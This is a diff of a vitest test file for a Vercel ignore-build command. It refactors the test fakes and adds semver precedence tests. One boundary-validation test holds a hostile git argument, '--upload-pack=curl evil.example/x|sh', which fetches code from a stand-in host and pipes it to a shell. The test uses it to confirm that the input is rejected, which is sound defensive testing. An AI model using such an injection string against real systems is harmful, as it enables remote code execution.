@@ -1,3 +1,5 @@
+import path from 'node:path';
+
 import { describe, expect, it } from 'vitest';
 
 import {
@@ -33,7 +35,10 @@ import {
  */
 
 const REPOSITORY_ROOT = '/repo';
-const ROOT_PACKAGE_JSON_PATH = '/repo/package.json';
+// Host form of the root package.json path: the command resolves it against
+// the repository root, so the fake's guard must expect the host-joined form
+// (drive-prefixed backslash path on Windows, `/repo/package.json` on POSIX).
+const ROOT_PACKAGE_JSON_PATH = path.resolve(REPOSITORY_ROOT, 'package.json');
 const VALID_SHA = 'a'.repeat(40);
 const VALID_SHA_OTHER = 'b1'.repeat(20);
 
@@ -84,6 +89,13 @@ function queuedGitShow(...outcomes) {
   };
   fn.calls = calls;
   return fn;
+}
+
+/** A capability fake that must never be reached; when it is, it names itself and the reason. */
+function unexpectedCall(capability, reason) {
+  return () => {
+    throw new Error(`${capability} should not be called ${reason}`);
+  };
 }
 
 function queuedGitFetch(...outcomes) {
@@ -235,15 +247,9 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
   it('row 1: branch !== main → continues without consulting git or the file system', () => {
     const stdout = captureWriter();
     const stderr = captureWriter();
-    const readFile = () => {
-      throw new Error('readFile should not be called when branch is not main');
-    };
-    const fakeGitShow = () => {
-      throw new Error('gitShowFileAtSha should not be called when branch is not main');
-    };
-    const fakeGitFetch = () => {
-      throw new Error('gitFetchShallow should not be called when branch is not main');
-    };
+    const readFile = unexpectedCall('readFile', 'when branch is not main');
+    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when branch is not main');
+    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when branch is not main');
 
     const result = runVercelIgnoreCommand({
       repositoryRoot: REPOSITORY_ROOT,
@@ -382,12 +388,8 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
   it('row 5: main, current unresolvable → CANCELS with stderr diagnostic', () => {
     const stdout = captureWriter();
     const stderr = captureWriter();
-    const fakeGitShow = () => {
-      throw new Error('gitShowFileAtSha should not be called when current is unresolvable');
-    };
-    const fakeGitFetch = () => {
-      throw new Error('gitFetchShallow should not be called when current is unresolvable');
-    };
+    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when current is unresolvable');
+    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when current is unresolvable');
 
     const result = runVercelIgnoreCommand({
       repositoryRoot: REPOSITORY_ROOT,
@@ -533,12 +535,8 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
     const stdout = captureWriter();
     const stderr = captureWriter();
     const hostile = '--upload-pack=curl evil.example/x|sh';
-    const fakeGitShow = () => {
-      throw new Error('gitShowFileAtSha should not be called when previous sha is invalid');
-    };
-    const fakeGitFetch = () => {
-      throw new Error('gitFetchShallow should not be called when previous sha is invalid');
-    };
+    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when previous sha is invalid');
+    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when previous sha is invalid');
 
     const result = runVercelIgnoreCommand({
       repositoryRoot: REPOSITORY_ROOT,
@@ -619,12 +617,8 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
     const stdout = captureWriter();
     const stderr = captureWriter();
     const tooShort = 'abc1234';
-    const fakeGitShow = () => {
-      throw new Error('gitShowFileAtSha should not be called when previous sha is invalid');
-    };
-    const fakeGitFetch = () => {
-      throw new Error('gitFetchShallow should not be called when previous sha is invalid');
-    };
+    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when previous sha is invalid');
+    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when previous sha is invalid');
 
     const result = runVercelIgnoreCommand({
       repositoryRoot: REPOSITORY_ROOT,
@@ -829,4 +823,69 @@ describe('runVercelIgnoreCommand — redeploy of the already-deployed commit (MC
     expect(result).toStrictEqual({ exitCode: 0 });
     expect(stderr.text()).toContain('current app version could not be determined');
   });
+});
+
+/** Drives the main-branch decision for one (current, previous) version pair. */
+function decide(currentVersion, previousVersion) {
+  const stdout = captureWriter();
+  const stderr = captureWriter();
+  const result = runVercelIgnoreCommand({
+    repositoryRoot: REPOSITORY_ROOT,
+    env: { VERCEL_GIT_COMMIT_REF: 'main', VERCEL_GIT_PREVIOUS_SHA: VALID_SHA },
+    stdout,
+    stderr,
+    readFile: packageReadFile(currentVersion),
+    gitShowFileAtSha: queuedGitShow({
+      kind: 'return',
+      text: JSON.stringify({ version: previousVersion }),
+    }),
+    gitFetchShallow: queuedGitFetch(),
+  });
+  return { exitCode: result.exitCode, stdout: stdout.text(), stderr: stderr.text() };
+}
+
+describe('runVercelIgnoreCommand — semver §2 grammar and §11 precedence at the version boundary', () => {
+  it.each([
+    ['1.6.0-rc.2', '1.6.0-rc.1', 'a later prerelease identifier'],
+    ['1.6.0-rc.10', '1.6.0-rc.9', 'a numerically later prerelease identifier'],
+    ['1.6.0', '1.6.0-rc.1', 'the release after its prerelease'],
+    ['1.6.0-rc.1.1', '1.6.0-rc.1', 'a longer prerelease sharing the prefix'],
+    ['1.6.0-beta-2', '1.6.0-alpha-9', 'a prerelease identifier carrying a hyphen'],
+    ['1.6.0+build.7', '1.5.0', 'build metadata on the advancing side'],
+  ])('continues when %s advances beyond %s (%s)', (current, previous) => {
+    const decision = decide(current, previous);
+    expect(decision.exitCode).toBe(1);
+    expect(decision.stdout).toContain(`current=${current}, previous=${previous}`);
+  });
+
+  it.each([
+    ['1.6.0+build.2', '1.6.0+build.1', 'build metadata carries no precedence'],
+    ['1.6.0-rc.1', '1.6.0', 'a prerelease precedes its release'],
+    ['1.6.0-rc.1', '1.6.0-rc.1+sha.abc', 'build metadata on the deployed side'],
+    ['1.6.0-alpha', '1.6.0-alpha.1', 'a shorter prerelease sharing the prefix'],
+  ])('cancels when %s does not advance beyond %s (%s)', (current, previous) => {
+    const decision = decide(current, previous);
+    expect(decision.exitCode).toBe(0);
+    expect(decision.stdout).toContain(
+      `${current} did not advance beyond previous deployed version ${previous}`,
+    );
+  });
+
+  it.each(['v1.6.0', '1.6', '01.6.0', '1.6.0-', '1.6.0+', '1.6.0-rc..1', '1.6.0-rc+', 'latest'])(
+    'cancels as unresolvable when the current version %s is not strict semver',
+    (current) => {
+      const decision = decide(current, '1.5.0');
+      expect(decision.exitCode).toBe(0);
+      expect(decision.stderr).toContain('could not be determined');
+    },
+  );
+
+  it.each(['v1.5.0', '1.5', '1.5.0-', '1.5.0+build+2'])(
+    'treats a previous version %s that is not strict semver as unset and continues',
+    (previous) => {
+      const decision = decide('1.6.0', previous);
+      expect(decision.exitCode).toBe(1);
+      expect(decision.stdout).toContain('previous=unknown (treating as first build)');
+    },
+  );
 });
